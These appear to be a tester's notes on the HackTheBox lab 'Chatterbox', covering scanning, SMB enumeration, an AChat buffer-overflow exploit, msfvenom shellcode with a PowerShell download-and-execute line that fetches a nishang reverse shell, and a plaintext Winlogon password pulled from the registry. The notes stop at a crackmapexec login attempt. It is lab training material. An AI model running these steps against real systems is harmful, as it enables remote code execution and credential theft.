Chatterbox IP:


rustscan:


PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
9255/tcp  open  mon          syn-ack
9256/tcp  open  unknown      syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49155/tcp open  unknown      syn-ack
49156/tcp open  unknown      syn-ack
49157/tcp open  unknown      syn-ack


nmap:


PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         syn-ack AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        syn-ack AChat chat system
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m01s, deviation: 2h18m34s, median: 5h00m01s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44596/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38735/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64306/udp): CLEAN (Timeout)
|   Check 4 (port 64783/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-04T15:15:43-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-04T19:15:44
|_  start_date: 2023-04-04T19:11:58








enum4linux:


enum4linux -v 10.10.10.74
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr  4 10:14:45 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.74
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.74    |
 =================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.10.74'
[E] Can't find workgroup/domain


 =========================================== 
|    Nbtstat Information for 10.10.10.74    |
 =========================================== 
Looking up status of 10.10.10.74
No reply from 10.10.10.74

 ==================================== 
|    Session Check on 10.10.10.74    |
 ==================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.74'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.10.74 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================== 
|    Getting domain SID for 10.10.10.74    |
 ========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.10.74 -c 'lsaquery' 2>&1
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 10.10.10.74    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.10.74'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.74 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.10.74' 2>&1
[+] Got OS info for 10.10.10.74 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on 10.10.10.74    |
 ============================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.10.74' 2>&1
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.74' 2>&1
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ======================================== 
|    Share Enumeration on 10.10.10.74    |
 ======================================== 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.74

 =================================================== 
|    Password Policy Information for 10.10.10.74    |
 =================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.10.74' 2>&1
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.74 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.74)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.10.74' -c "getdompwinfo" 2>&1

[E] Failed to get password policy with rpcclient


 ============================= 
|    Groups on 10.10.10.74    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.10.74' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.10.74' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.10.74' -c "enumdomgroups" 2>&1

[+] Getting domain groups:

[+] Getting domain group memberships:

 ====================================================================== 
|    Users on 10.10.10.74 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.10.74 with command: rpcclient -W '' -U''%'' '10.10.10.74' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.10.74 with command: rpcclient -W '' -U''%'' '10.10.10.74' -c lsaenumsid 2>&1

 ============================================ 
|    Getting printer info for 10.10.10.74    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.10.74' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Apr  4 10:15:13 2023



smb:


smbmap -H 10.10.10.74                                     
[+] IP: 10.10.10.74:445 Name: 10.10.10.74                                       
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Chatterbox]
└─$ smbmap -H 10.10.10.74 -u guest
[!] Authentication error on 10.10.10.74
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Chatterbox]
└─$ smbclient -N -L //10.10.10.74                           
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available




searchsploit Achat                  
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                                                         | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                                                            | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                                                                 | php/webapps/24647.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results



searchsploit -m windows/remote/36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/kali/Practice/HackTheBox/Chatterbox/36025.py


Copy nishang Invoke-PowerShellTcp.ps1 script and rename to shell.ipp and add the following line at end of the shell.ipp script created

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 4444


Generate payload using msfvenom to call the modified shell.ipp

msfvenom -a x86 -platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/shell.ipp')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 672 (iteration=0)
x86/unicode_mixed chosen with final size 672
Payload size: 672 bytes
Final size of python file: 3315 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x6b\x4c\x49\x58\x44\x42\x39\x70"
buf += b"\x59\x70\x49\x70\x31\x50\x65\x39\x58\x65\x4e\x51"
buf += b"\x75\x70\x52\x44\x34\x4b\x70\x50\x50\x30\x62\x6b"
buf += b"\x6e\x72\x7a\x6c\x62\x6b\x50\x52\x6e\x34\x44\x4b"
buf += b"\x70\x72\x4d\x58\x6c\x4f\x44\x77\x50\x4a\x4c\x66"
buf += b"\x70\x31\x39\x6f\x64\x6c\x6d\x6c\x70\x61\x31\x6c"
buf += b"\x6a\x62\x6c\x6c\x4f\x30\x65\x71\x38\x4f\x5a\x6d"
buf += b"\x69\x71\x77\x57\x6b\x32\x38\x72\x61\x42\x4f\x67"
buf += b"\x42\x6b\x6e\x72\x5a\x70\x34\x4b\x6f\x5a\x4f\x4c"
buf += b"\x34\x4b\x70\x4c\x4e\x31\x63\x48\x68\x63\x6f\x58"
buf += b"\x4d\x31\x57\x61\x72\x31\x34\x4b\x71\x49\x6f\x30"
buf += b"\x49\x71\x59\x43\x72\x6b\x61\x39\x6b\x68\x67\x73"
buf += b"\x4e\x5a\x61\x39\x44\x4b\x4c\x74\x44\x4b\x49\x71"
buf += b"\x5a\x36\x30\x31\x79\x6f\x46\x4c\x65\x71\x66\x6f"
buf += b"\x6a\x6d\x4b\x51\x38\x47\x6c\x78\x49\x50\x51\x65"
buf += b"\x6a\x56\x7a\x63\x63\x4d\x79\x68\x6d\x6b\x73\x4d"
buf += b"\x4e\x44\x34\x35\x57\x74\x52\x38\x54\x4b\x31\x48"
buf += b"\x4e\x44\x6b\x51\x49\x43\x52\x46\x42\x6b\x6a\x6c"
buf += b"\x50\x4b\x74\x4b\x4f\x68\x6b\x6c\x4d\x31\x68\x53"
buf += b"\x74\x4b\x4d\x34\x54\x4b\x49\x71\x78\x50\x45\x39"
buf += b"\x6d\x74\x4d\x54\x4f\x34\x6f\x6b\x4f\x6b\x4f\x71"
buf += b"\x4e\x79\x70\x5a\x4f\x61\x69\x6f\x59\x50\x4f\x6f"
buf += b"\x51\x4f\x4e\x7a\x72\x6b\x4e\x32\x68\x6b\x32\x6d"
buf += b"\x51\x4d\x62\x4a\x59\x71\x72\x6d\x32\x65\x75\x62"
buf += b"\x59\x70\x69\x70\x69\x70\x4e\x70\x43\x38\x4e\x51"
buf += b"\x42\x6b\x62\x4f\x62\x67\x4b\x4f\x6a\x35\x57\x4b"
buf += b"\x48\x70\x75\x65\x65\x52\x71\x46\x33\x38\x45\x56"
buf += b"\x42\x75\x57\x4d\x55\x4d\x4b\x4f\x79\x45\x6d\x6c"
buf += b"\x59\x76\x63\x4c\x7a\x6a\x55\x30\x69\x6b\x6b\x30"
buf += b"\x52\x55\x5a\x65\x67\x4b\x4e\x67\x7a\x73\x62\x52"
buf += b"\x32\x4f\x50\x6a\x4d\x30\x6e\x73\x39\x6f\x37\x65"
buf += b"\x30\x70\x42\x4f\x71\x67\x6f\x75\x62\x52\x71\x63"
buf += b"\x62\x48\x30\x65\x62\x4c\x32\x4c\x6d\x50\x6e\x42"
buf += b"\x6f\x59\x31\x35\x51\x48\x6b\x78\x70\x4e\x73\x35"
buf += b"\x43\x47\x6e\x4d\x70\x4f\x70\x62\x4f\x7a\x70\x65"
buf += b"\x42\x43\x44\x34\x6d\x50\x30\x4e\x61\x55\x51\x64"
buf += b"\x4e\x4e\x4f\x67\x72\x45\x62\x42\x4f\x53\x72\x4c"
buf += b"\x33\x39\x62\x45\x32\x4e\x31\x64\x6f\x39\x6c\x6e"
buf += b"\x61\x54\x50\x6f\x50\x77\x62\x4e\x62\x4c\x72\x4f"
buf += b"\x73\x31\x51\x54\x51\x43\x33\x44\x50\x72\x31\x59"
buf += b"\x72\x4e\x73\x37\x4b\x78\x6e\x47\x62\x48\x71\x64"
buf += b"\x53\x44\x62\x50\x6c\x7a\x4c\x6f\x6e\x4f\x6c\x71"
buf += b"\x6c\x70\x6c\x6e\x70\x31\x4c\x70\x4e\x4e\x70\x31"
buf += b"\x4d\x64\x6e\x4e\x70\x37\x4e\x4f\x72\x53\x6f\x78"
buf += b"\x32\x45\x32\x4c\x70\x6c\x6c\x6e\x4f\x79\x62\x50"
buf += b"\x72\x50\x4e\x47\x4e\x49\x4c\x62\x4d\x30\x41\x41"


Replace shell code with your own generated code and change server_address

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

host the shell:

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Chatterbox]
└─$ sudo python -m SimpleHTTPServer 80                               
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 ...

start nc listener:

nc -lvnp 4444


run python script:
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Chatterbox]
└─$ python 36025.py
---->{P00F}!


┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                                                                            
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.74] 49161
Windows PowerShell running as user Alfred on CHATTERBOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>


User flag:

PS C:\Users\Alfred\Desktop> type user.txt
0c9c60aa91ff2991f3218a145767e4d7


PrivEsc:

PS C:\Users\Alfred\Desktop> systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          4/4/2023, 3:11:49 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,481 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,552 MB
Virtual Memory: In Use:    543 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB2479943
                           [08]: KB2491683
                           [09]: KB2506212
                           [10]: KB2506928
                           [11]: KB2509553
                           [12]: KB2533552
                           [13]: KB2534111
                           [14]: KB2545698
                           [15]: KB2547666
                           [16]: KB2552343
                           [17]: KB2560656
                           [18]: KB2563227
                           [19]: KB2564958
                           [20]: KB2574819
                           [21]: KB2579686
                           [22]: KB2604115
                           [23]: KB2620704
                           [24]: KB2621440
                           [25]: KB2631813
                           [26]: KB2639308
                           [27]: KB2640148
                           [28]: KB2647753
                           [29]: KB2654428
                           [30]: KB2660075
                           [31]: KB2667402
                           [32]: KB2676562
                           [33]: KB2685811
                           [34]: KB2685813
                           [35]: KB2690533
                           [36]: KB2698365
                           [37]: KB2705219
                           [38]: KB2719857
                           [39]: KB2726535
                           [40]: KB2727528
                           [41]: KB2729094
                           [42]: KB2732059
                           [43]: KB2732487
                           [44]: KB2736422
                           [45]: KB2742599
                           [46]: KB2750841
                           [47]: KB2761217
                           [48]: KB2763523
                           [49]: KB2770660
                           [50]: KB2773072
                           [51]: KB2786081
                           [52]: KB2799926
                           [53]: KB2800095
                           [54]: KB2807986
                           [55]: KB2808679
                           [56]: KB2813430
                           [57]: KB2820331
                           [58]: KB2834140
                           [59]: KB2840631
                           [60]: KB2843630
                           [61]: KB2847927
                           [62]: KB2852386
                           [63]: KB2853952
                           [64]: KB2857650
                           [65]: KB2861698
                           [66]: KB2862152
                           [67]: KB2862330
                           [68]: KB2862335
                           [69]: KB2864202
                           [70]: KB2868038
                           [71]: KB2871997
                           [72]: KB2884256
                           [73]: KB2891804
                           [74]: KB2892074
                           [75]: KB2893294
                           [76]: KB2893519
                           [77]: KB2894844
                           [78]: KB2900986
                           [79]: KB2908783
                           [80]: KB2911501
                           [81]: KB2912390
                           [82]: KB2918077
                           [83]: KB2919469
                           [84]: KB2923545
                           [85]: KB2931356
                           [86]: KB2937610
                           [87]: KB2943357
                           [88]: KB2952664
                           [89]: KB2966583
                           [90]: KB2968294
                           [91]: KB2970228
                           [92]: KB2972100
                           [93]: KB2973112
                           [94]: KB2973201
                           [95]: KB2973351
                           [96]: KB2977292
                           [97]: KB2978742
                           [98]: KB2984972
                           [99]: KB2985461
                           [100]: KB2991963
                           [101]: KB2992611
                           [102]: KB3003743
                           [103]: KB3004361
                           [104]: KB3004375
                           [105]: KB3006121
                           [106]: KB3006137
                           [107]: KB3010788
                           [108]: KB3011780
                           [109]: KB3013531
                           [110]: KB3020370
                           [111]: KB3020388
                           [112]: KB3021674
                           [113]: KB3021917
                           [114]: KB3022777
                           [115]: KB3023215
                           [116]: KB3030377
                           [117]: KB3035126
                           [118]: KB3037574
                           [119]: KB3042058
                           [120]: KB3045685
                           [121]: KB3046017
                           [122]: KB3046269
                           [123]: KB3054476
                           [124]: KB3055642
                           [125]: KB3059317
                           [126]: KB3060716
                           [127]: KB3061518
                           [128]: KB3067903
                           [129]: KB3068708
                           [130]: KB3071756
                           [131]: KB3072305
                           [132]: KB3074543
                           [133]: KB3075226
                           [134]: KB3078601
                           [135]: KB3078667
                           [136]: KB3080149
                           [137]: KB3084135
                           [138]: KB3086255
                           [139]: KB3092627
                           [140]: KB3093513
                           [141]: KB3097989
                           [142]: KB3101722
                           [143]: KB3102429
                           [144]: KB3107998
                           [145]: KB3108371
                           [146]: KB3108381
                           [147]: KB3108664
                           [148]: KB3109103
                           [149]: KB3109560
                           [150]: KB3110329
                           [151]: KB3118401
                           [152]: KB3122648
                           [153]: KB3123479
                           [154]: KB3126587
                           [155]: KB3127220
                           [156]: KB3133977
                           [157]: KB3137061
                           [158]: KB3138378
                           [159]: KB3138612
                           [160]: KB3138910
                           [161]: KB3139398
                           [162]: KB3139914
                           [163]: KB3140245
                           [164]: KB3147071
                           [165]: KB3150220
                           [166]: KB3150513
                           [167]: KB3156016
                           [168]: KB3156019
                           [169]: KB3159398
                           [170]: KB3161102
                           [171]: KB3161949
                           [172]: KB3161958
                           [173]: KB3172605
                           [174]: KB3177467
                           [175]: KB3179573
                           [176]: KB3184143
                           [177]: KB3185319
                           [178]: KB4014596
                           [179]: KB4019990
                           [180]: KB4040980
                           [181]: KB976902
                           [182]: KB982018
                           [183]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74



As Alfred, we can go to Administrator\Desktop but we cannot read root.txt

To get an administrator shell, check in registry that there is stored password:

PS C:\Users\Administrator\Desktop> reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7be73787-ce71-4b33-b4c8-00d32b54bea8}
    (Default)    REG_SZ    HomeGroup Password

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{63d2bb1d-e39a-41b8-9a3d-52dd06677588}\ChannelReferences\5
    (Default)    REG_SZ    Microsoft-Windows-Shell-AuthUI-PasswordProvider/Diagnostic

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password - PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

we have a password, let's try to use it:

(kali㉿kali)-[~/Practice/HackTheBox/Chatterbox]
└─$ crackmapexec smb 10.10.10.74 -u administrator  -p Welcome1!
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
